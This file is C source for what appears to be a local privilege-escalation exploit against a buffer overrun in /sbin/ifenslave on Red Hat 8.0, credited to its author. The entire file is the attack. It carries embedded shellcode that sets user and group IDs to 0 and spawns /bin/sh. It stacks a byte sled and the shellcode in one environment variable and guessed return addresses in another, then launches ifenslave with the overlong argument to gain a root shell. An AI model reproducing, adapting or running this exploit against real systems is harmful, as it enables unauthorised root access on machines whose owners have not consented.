/*
 * lame local /sbin/ifenslave buffer overrun exploit
 * tested on redhat 8.0
 * by v1pee//nerf, nerf.ru
 * v1pee@ngs.ru
*/

#include <unistd.h>

char shellcode[] =
"\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
"\x31\xc0\x50\x50\xb0\xb5\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

long getsp() {
__asm__("movl %esp,%eax");
}

int 
main(int argc, char *argv[]) {

char *buffer, *shity, *ptr;
long *addr_ptr, addr;
int i, offset=0; 
int bufsize=128;
int eggsize=512;

if (argc > 1) offset = atoi(argv[1]);
if (argc > 2) eggsize = atoi(argv[2]);

buffer = malloc(bufsize);
shity = malloc(eggsize);

addr = getsp() - offset;
printf("local /sbin/ifenslave exploit (red hat 8.0)\n");
printf("RET: 0x%x\nOffset: %d\n", addr,offset);
ptr = buffer;

addr_ptr = (long *) ptr;

// fills rets 
for (i = 0; i < bufsize; i+=4)
*(addr_ptr++) = addr;

ptr = shity;

// fills NOP instructions in
for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
*(ptr++) = 0x41;

// fills shellcode 
for (i = 0; i < strlen(shellcode); i++)
*(ptr++) = shellcode[i];

setenv("EGG",shity,4);  // consists of nops and shellcode
setenv("XXX",buffer,4); // consists of addrs to new envp 

system("/sbin/ifenslave -a $XXX");
}


